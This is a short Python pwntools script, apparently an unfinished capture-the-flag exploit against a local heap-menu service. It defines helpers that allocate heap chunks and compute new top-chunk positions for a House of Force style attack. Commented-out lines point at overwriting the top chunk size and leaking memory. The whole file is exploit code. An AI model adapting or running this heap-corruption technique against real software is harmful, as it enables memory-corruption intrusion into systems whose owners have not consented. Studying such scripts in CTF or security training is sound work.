from pwn import *

context.arch='amd64'

host = '127.0.0.1'
port = 8888
r = remote(host, port)

def allocate_heap(size, data, sendline=True, top=0, top_size=0):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)
    if top != 0:
        change = 0x10 + (size&0xfffffffffffffff0)
        return top + change, top_size - change

def show_heap():
    r.recvuntil(':')
    r.sendline(b'2')

def gen_new_top(addr, old_top, old_top_size):
    nb = (addr - 0x10) - old_top - 0x10
    nb &= 0xfffffffffffffff0
    allocate_heap(nb, b'a')
    # print predicted
    new_top = old_top + (nb + 0x10)
    new_top_size = old_top_size - (nb + 0x10)
    return new_top, new_top_size

max_malloc = 0x165000000
malloc2mmap = 0x20008

allocate_heap(0x40, b'a')
allocate_heap(malloc2mmap, b'a')
# allocate_heap(malloc2mmap, b'a'*malloc2mmap + p64(0xffffffffffffffff))
# r.recvuntil(':')
# show_heap()
# r.recvn(1) # one blank
# r.recvn(malloc2mmap+0x8)
# get = r.recvuntil('\n')
# print(get)

r.interactive()
